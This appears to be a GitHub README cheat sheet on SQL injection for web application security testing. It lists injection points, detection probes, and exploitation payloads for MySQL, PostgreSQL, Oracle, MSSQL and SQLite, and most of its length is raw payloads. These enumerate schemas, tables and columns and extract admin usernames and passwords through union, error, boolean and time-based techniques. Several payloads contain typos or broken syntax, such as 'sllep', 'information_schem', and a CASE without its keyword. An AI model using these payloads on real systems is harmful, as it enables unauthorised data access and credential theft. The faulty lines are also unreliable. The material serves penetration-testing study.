# SQL Injection

- [Types](https://github.com/SpiderSec101/Web_Application_Security_Testing/edit/main/Cheat_Sheet/SQL%20Injection/Readme.md#types-of-sql-injection)
- [Injection Points](https://github.com/SpiderSec101/Web_Application_Security_Testing/edit/main/Cheat_Sheet/SQL%20Injection/Readme.md#sql-injection-points)
- [Detection](https://github.com/SpiderSec101/Web_Application_Security_Testing/edit/main/Cheat_Sheet/SQL%20Injection/Readme.md#detecting-sql-injection)
- [Exploitation](https://github.com/SpiderSec101/Web_Application_Security_Testing/edit/main/Cheat_Sheet/SQL%20Injection/Readme.md#exploitation)
---
### Types of SQL Injection

* In Band SQL Injection
* Blind SQL Injection
* OutOfBand Injection

### SQL Injection Points

- **`Login Form`**
- **`Url Search Parameters`**
- **`Url id values`**
- **`Cookie Values`**
- **`XML encoded values like <storeId>**</storeId>`**
- **`Form Input Sections`**
- **`File Upload Sections`**

## Detecting SQL Injection

*  Error Based

        '
        "
        ;
        ;--
        ;#
        `
        ')
        ")
        `)
        '))
        "))
        `))

* Union Based

      ' union select 1,2,3,4;-- -
      ' order by 1,2,3,4;-- -
      ' union select null,null,null,null;-- -
* Boolean Based

      ' and true;-- -
      ' and false;-- -
      ' and 1=1;-- -
      ' and 1=2; -- -
      ' or 1=1; -- -
      ' or 1+2 = 3;-- - 
      ' and 'a' is not 'b
      ' or '1' = '1
* Time Based

  * MySQL
    
        '; select sleep 10;-- -
        ' and sllep 10; -- -
        ' && sleep 10; -- -
        ' | sleep 10; -- -
  * PostgreSQL
    
        ' || pg_sleep(10);-- -
        '; select pg_sleep(10);-- -
  * Oracle
        
        1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
        1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
  * MSSQL

        ' waitfor_delay '0.0.10
  * SQLite

        1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
        1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))

## Exploitation

#### In-Band SQL Injection

- Union Based Attack
```sql
' UNION SELECT 1,2,3,4;-- -
```
```sql
' union select 1,2,group_concat(schema_name),4 from information_schema.tables;-- -
```
```sql
' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=<database_name>
```
```sql
' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name = <the_table_name>
```

- Error Based Attacks
```sql
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT version()), '~|~'));-- -
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT @@version), '~|~'));-- -
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT database()), '~|~'));--
```
- Stack Based Attack
```sql
'; select group_concat(schema_name) from information_schem.tables;-- -
```

#### Boolean SQLInjection 

- Extracting database name
```sql
id  =  2'  and  length(database())  >  10;--
```
```sql
id  =  2'  and  ascii(substr(database(),1,1)) > 100;--
```
```sql
id  =  2'  and  ascii(substr(database(),2,1)) > 100;--
```
- Extracting table names
```sql
id  =  2'  and  (length(select  table_name  from  information_schema.tables  where  table_schema = '<name of database>' limit 0,1))  >  10;--
```
```sql
id  =  2'  and  ascii(substr(((select  table_name  from  information_schema.tables  where  table_schema = '<name of database>') limit 0,1),1,1)) > 100;--
```
```sql
id  =  2'  and  ascii(substr(((select  table_name  from  information_schema.tables  where  table_schema = '<name of database>') limit 2,1),1,1)) > 100;--
```
```sql
id  =  2'  and  ascii(substr(((select  column_name  from  information_schema.columns  where  (table_schema = '<name of database>'  and  table_name = <table name>) limit 0,1),1,1))  >  100;--
```
- Column name enumeration
```sql
id  =  2'  and  ascii(substr(((select  column_name  from  information_schema.columns  where  (table_schema = '<name of database>'  and  table_name = <table name>  and  column_name  !=  <one of the column>) limit 0,1),1,1)) > 100;--
```
- Data Extract
```sql
id  =  2' and  length((select  column_name_here  from  <table name>) limit 0,1)  >  10;--
```
```sql
id  =  2' and  ascii(substr(((select column_name_here  from  <table name>) limit 0,1),1,1)) > 100;--
```
- Admin password extract
```sql
id=1' and (select username from tabke_name_here where username = 'admin') = 'admin';-- -
id=1' and (select username from table_name_here where username = 'admin' and (length(password) > 10)) = 'admin';-- -
id=1' and (select username from table_name_here where username = 'admin' and (ascii(substr(select password from table_name_here where usrename = 'admin')1,1) > 100) = 'admin';-- -
```
#### Time Based Injection
- Functions to be used

        sleep(10)
        pg_sleep(10)
        waitfor delay '0.0.10'
        benchmark()
- General Syntax
```sql
hvdhjv’; select case 
when (1=1) then pg_sleep(10) 
else pg_sleep(0) 
end ;
```
- Table Name Enumeration
```sql
hvdhjv’; select case 
when ((ascii(substring(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>10) 
then pg_sleep(10) 
else pg_sleep(0) 
end ;
```
- Column Name Enumeration
```sql
hvdhjv’; select case when ((ascii(substring(select column_name from information_schema.columns where table_name=<table_name> limit 1),1,1))>10) then pg_sleep(10) else pg_sleep(0) end ;
```
- Username and Password
```sql
hvdhjv’; select case when ((ascii(substring(select username from <table_name> limit 0,1),1,1))>10) then pg_sleep(10) else pg_sleep(0) end ;
```
- Admin password enumeration
```sql
xyz'|| (case when (substr((select password from users where username='administrator'),1,1) = 'a') then pg_sleep(10) else pg_sleep(0) end) || '
```
```sql
hvdhjv’; select when ((ascii(substring(select password from <table_name> where username='admin'),1,1))>100) then pg_sleep(10) else pg_sleep(0) end ;
```






























































































































































































































































































































































































































































































